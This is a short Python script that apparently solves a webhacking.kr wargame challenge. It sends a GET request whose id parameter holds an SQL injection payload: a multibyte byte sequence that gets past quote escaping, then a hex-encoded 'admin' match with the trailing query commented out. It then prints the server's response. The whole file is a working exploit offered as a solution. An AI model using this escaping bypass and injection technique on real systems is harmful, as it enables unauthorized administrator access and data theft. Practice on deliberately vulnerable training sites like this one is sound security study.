import requests

if __name__ == "__main__":
    id = "1%aa%27%20or%20id%20like%20char(0x61,0x64,0x6d,0x69,0x6e)%23"
    url = f"https://webhacking.kr/challenge/web-22/?id={id}&pw=guest"
    cookies = {"PHPSESSID": ""}
    response = requests.get(url, cookies=cookies)
    print(response.text)
